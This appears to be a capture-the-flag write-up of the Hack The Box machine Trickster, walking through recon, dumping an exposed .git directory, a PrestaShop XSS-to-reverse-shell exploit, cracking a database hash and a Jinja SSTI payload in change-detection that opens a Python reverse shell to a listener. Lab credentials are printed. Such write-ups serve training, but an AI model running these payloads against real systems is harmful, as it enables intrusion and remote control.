TRICKSTER SEASON 6 WRITEUP

RECON
----  
Started With a Port Scan 

**Sudo nmap -sS -Pn -T5 -p- $ip | rustscan --ulimit 5000 -a $ip -- -sC -sV**

![image](https://github.com/user-attachments/assets/f63c71de-024f-419b-91b9-eba7520fe500)

Port TCP 22 --> OpenSSH 8.9p1 OPEN

Port TCP 80 --> apache 2.4.52 OPEN

Left port 22 As BruteForce Won't Be the Way, So Stared Investigating port 80

Added trickster.htb to /etc/hosts

![image](https://github.com/user-attachments/assets/69e68c07-2830-4c6a-967a-c4d7bff0f708)

trickster.htb was just a plain static site and sub dir fuzzing came up with nothing of use  
but there was a link to shop.trickster.htb so added that too /etc/hosts and starting investigating

![image](https://github.com/user-attachments/assets/ecb3ecf7-a301-481b-b693-d920dc8bf3ec)

shop.trickster was running prestashop so i started sub dir and sub domain fuzzing

**gobuster dir -w /usr/share/seclists/Discovery/web-content/common.txt -u $url -x html,php,js,pdf,bak,sql -t 40**  
**ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u $url -H "Host: FUZZ.shop.trickster.htb" -fw 314**  

sub domain was a dead end but sub dir gave some good results
i couldnt find the admin dir but it did come up with an exposed .git directory
so i used gitdumper [https://github.com/arthaud/git-dumper]

**python3 gitdumper.py $url git**

After it finished running i found the admin directory was changed too admin634ewutrx1jgitlooaj

Investing http://shop.trickster.htb/admin634ewutrx1jgitlooaj show me it was running
prestashop 8.1.5

searching for some exploits i found it was vuln to CVE-2024-34716, which is a xss vuln in the contact form of the page
which can be chained with an import theme function to install a reverse shell

FOOTHOLD
-----
make email on website too  
**git clone https://github.com/aelmokhtar/CVE-2024-34716.git**


|-inside reverse_shell.php --> change ip to my ip | not needed pre sure  
|  
|-unzip the .zip file --> change the other reverse_shell.php to my ip  
|----Rezip the .zip file, make sure .htaccess is zipped too  
|  
|-inside exploit.py --> change ncat to nc, or install ncat  
|  
|-inside exploit.html --> change baseUrl, too "http://shop.trickster.htb"  
|--change path too "admin634ewutrx1jgitlooaj"  
|---change httpServerIP too attackers IP  
|----change port to whatever port  

Now Start a python server in the dir with the .zip file 
**python3 -m http.server [port]**

Now run the exploit and we will get a foothold as www-data

WWW-DATA --> JAMES
--------------  
After doing some basic priv esc checks, linpeas, sudo -l, checking web directory ect  
nothing of interest came up, so i decided to look harder into the web directory after digging around for a while i found some database creds inside  
/var/www/prestashop/app/config/parameters.php  

ps_user : prest@shop_o

connecting to the db there were a bunch of tables but inside ps_employees i found  
![image](https://github.com/user-attachments/assets/9f575b4e-de98-49d4-a637-74d85fa43299)

so i saved james's hash to my machine then cracked it with hashcat

**hashcat -a 0 -m 3200 hash /usr/share/wordlists/rockyou.txt**
this gave me james's password for ssh  
james : foreverandalways

JAMES --> ROOT
-------
after getting ssh access to james i did some more checks but nothing came up useful apart from checking the network adaptors i saw a docker ip(172.17.0.1) so i started investigating that  
i did a ping sweep for the /24 range  

**for i in $(seq 1 254);do ping -c 1 172.17.0.$i; done | grep "64 bytes"**
the only other ip that responed was 172.1.0.2

checking out the open connections on the system i was able to see 172.1.0.2:5000

using curl i saw it was running a web server, so i port forwarded it with ssh  
**ssh -L 5000:172.1.0.2:5000 james@$ip**

after heading to the website i saw it was running change-detection v0.45.20 which was vuln to SSTI inside the notification text box

STEPS  

|-Start a Web server on the remote machine  
|--python3 -m http.server 8000  
|  
|-on the change detection site make a new config with the ip being "http://172.1.0.1:8000"  
|--press "Edit > Watch" --> "Notifications" 
|---inside the "Notifications URL List" Enter "get://<attacker-ip>"
|----Inside the Notification Body" Enter   
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{ x()._module.__builtins__['__import__']('os').popen("python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"listen_ip\",listen_port));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/bash\")'").read() }}{% endif %}{% endfor %}"  
and change the IP and PORT  
then press submit

now where the webserver is running just add any file, then go back to the the website and press "Recheck" 

and we will should have a shell

we will still be inside a docker container but we can get the root password from "history"

root : #YouC4ntCatchMe#






